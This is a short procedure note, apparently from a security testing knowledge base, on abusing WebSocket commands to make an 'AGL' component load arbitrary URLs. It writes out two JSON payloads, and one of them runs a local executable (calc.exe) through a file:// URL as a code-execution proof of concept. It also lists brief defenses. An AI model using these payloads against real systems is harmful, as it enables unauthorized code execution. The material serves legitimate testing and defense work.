---
tags:
  - url-loading
  - websocket
type: procedure
tools:
  - '[[tools/Process-Monitor]]'
  - '[[tools/Burp-Suite]]'
  - '[[tools/Request-Highlighter]]'
tactics:
  - '[[procedures/Exploit-NodeIntegration-for-Code-Execution]]'
commands:
  - '[[commands/websocket-seturldefaultbrowser-calc]]'
  - '[[commands/require-child-process-exec-calc]]'
platforms:
  - Windows
techniques:
  - '[[Inter-Process Communication]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 0f6eec96-9323-489d-876e-cd4d3be5ec1e
created_at: '2025-12-11T03:47:56.477Z'
updated_at: '2025-12-11T03:47:56.477Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1559]]'
---
# Test Arbitrary URL Loading via WebSocket

## Summary

This procedure sends WebSocket commands to load arbitrary URLs in the AGL component, testing for validation issues.

## Description

Using commands like setUrl and setUrlDefaultBrowser, arbitrary remote or local URLs can be loaded, potentially leading to execution. No validation on URL parameters enables this.

## Requirements

1. Established WebSocket connection
2. Burp Suite for sending JSON commands
3. Running AGL component

## Defense

Defensive measures and detection strategies:

- Validate and restrict URL parameters in commands
- Monitor for anomalous URL loads in Electron apps

## Objectives

1. Load remote URLs in AGL
2. Execute local files via file scheme
3. Confirm exploitation path

## Instructions

### Step 1: Send setUrl Command

**Context**: Instruct AGL to load a remote URL.

**Command** ([[commands/websocket-seturl-example]]):
```json
{"command":"setUrl","params":{"url":"https://example.net"},"source":"QAS","target":"AGL"}
```

> AGL loads the URL.

### Step 2: Send setUrlDefaultBrowser Command

**Context**: Execute a local file.

**Command** ([[commands/websocket-seturldefaultbrowser-calc]]):
```json
{"command":"setUrlDefaultBrowser","params":{"url":"file:///c:/windows/system32/calc.exe"},"source":"QAS","target":"AGL"}
```

> calc.exe launches.

## MITRE ATT&CK Mapping

### Tactics

- [[procedures/Exploit-NodeIntegration-for-Code-Execution]]

### Techniques

- [[Inter-Process Communication]]

### Sub-Techniques



## Commands Used

- [[commands/websocket-seturl-example]]
- [[commands/websocket-seturldefaultbrowser-calc]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- #url-loading
- [[commands/websocket-seturl-example]]
